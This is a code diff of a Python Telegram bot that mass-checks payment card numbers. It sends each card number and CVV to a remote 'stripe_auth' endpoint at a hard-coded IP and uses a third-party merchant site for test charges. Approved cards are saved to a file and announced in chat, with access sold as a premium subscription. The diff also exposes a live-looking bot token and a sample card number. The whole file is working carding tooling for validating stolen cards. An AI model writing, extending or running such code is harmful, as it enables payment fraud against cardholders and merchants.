@@ -10,12 +10,11 @@ BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"
 
 ADMIN_ID = [7077294261]
 
-# Files
 PREMIUM_FILE = "premium.json"
 BANNED_FILE = "banned_users.json"
 CC_FILE = "approved.txt"
 
-# ================== STRIPE CHECKER (Updated) ==================
+# ================== STRIPE CHECKER ==================
 async def check_stripe(card: str, site: str = "redbluechair.com"):
     try:
         url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site={site}"
@@ -24,12 +23,11 @@ async def check_stripe(card: str, site: str = "redbluechair.com"):
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get(url) as res:
                 if res.status != 200:
-                    return {"Response": f"HTTP Error {res.status}", "Status": "Declined"}
+                    return {"Response": f"HTTP {res.status}", "Status": "Declined"}
                 
                 data = await res.json()
                 response_text = data.get("Response", str(data))
                 
-                # Clean response if it's JSON inside
                 if isinstance(response_text, str) and response_text.startswith("{"):
                     try:
                         rj = json.loads(response_text)
@@ -45,16 +43,23 @@ async def check_stripe(card: str, site: str = "redbluechair.com"):
         return {"Response": f"Error: {str(e)[:100]}", "Status": "Declined"}
 
 
-# ================== UTILITIES ==================
+# ================== FIXED UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
             async with aiofiles.open(filename, "w") as f:
                 await f.write(json.dumps({}))
+            return {}
+        
         async with aiofiles.open(filename, "r") as f:
-            content = await f.read()
-            return json.loads(content) if content.strip() else {}
-    except:
+            content = await f.read().strip()
+            if not content:
+                return {}
+            return json.loads(content)
+    except Exception:
+        # If file is corrupted, reset it
+        async with aiofiles.open(filename, "w") as f:
+            await f.write(json.dumps({}))
         return {}
 
 async def save_json(filename, data):
@@ -63,10 +68,11 @@ async def save_json(filename, data):
 
 async def is_premium_user(user_id):
     data = await load_json(PREMIUM_FILE)
-    if str(user_id) not in data:
+    uid = str(user_id)
+    if uid not in data:
         return False
     try:
-        expiry = datetime.datetime.fromisoformat(data[str(user_id)]['expiry'])
+        expiry = datetime.datetime.fromisoformat(data[uid]['expiry'])
         return datetime.datetime.now() <= expiry
     except:
         return False
@@ -97,19 +103,19 @@ async def mst(event):
     if event.is_private and not await is_premium_user(event.sender_id):
         return await event.reply("Premium required in PM.")
 
-    # Get text from reply or message
+    # Get text
     if event.reply_to_msg_id:
-        reply_msg = await event.get_reply_message()
-        text = reply_msg.text
+        reply = await event.get_reply_message()
+        text = reply.text
     else:
         text = event.raw_text
 
     cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', text)
     
     if not cards:
-        return await event.reply("❌ No valid cards found!\nFormat: `5443170628782539|06|30|222`")
+        return await event.reply("❌ No valid cards found!")
 
-    cards = cards[:100]  # Increased limit a bit
+    cards = cards[:100]
     asyncio.create_task(process_mass(event, cards))
 
 
@@ -118,34 +124,34 @@ async def process_mass(event, cards):
     checked = approved = 0
     status_msg = await event.reply(f"🔥 Checking **{total}** cards...")
 
-    for i in range(0, len(cards), 8):  # Batch of 8
+    for i in range(0, len(cards), 8):
         batch = cards[i:i+8]
         tasks = [check_stripe(card) for card in batch]
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
         for card, res in zip(batch, results):
             if isinstance(res, Exception):
-                res = {"Response": "Timeout/Error", "Status": "Declined"}
+                res = {"Response": "Error", "Status": "Declined"}
             
             checked += 1
             if res.get("Status") == "Approved":
                 approved += 1
                 await save_approved(card, res.get("Response"))
-                await event.reply(f"💎 **APPROVED**\n`{card}`\n**Response:** {res.get('Response')}")
+                await event.reply(f"💎 **APPROVED**\n`{card}`\n{res.get('Response')}")
 
             try:
                 await status_msg.edit(f"**Progress**\n✅ Approved: **{approved}**\n🔄 Checked: **{checked}/{total}**")
             except:
                 pass
 
-            await asyncio.sleep(1.2)  # Slight delay
+            await asyncio.sleep(1.2)
 
     await status_msg.edit(f"✅ **Finished!**\nApproved: **{approved}/{total}**")
 
 
 # ================== RUN ==================
 async def main():
-    print("🚀 Stripe Bot Started | API: 138.128.240.15:8009 | Site: redbluechair.com")
+    print("🚀 Stripe Bot Started | redbluechair.com")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
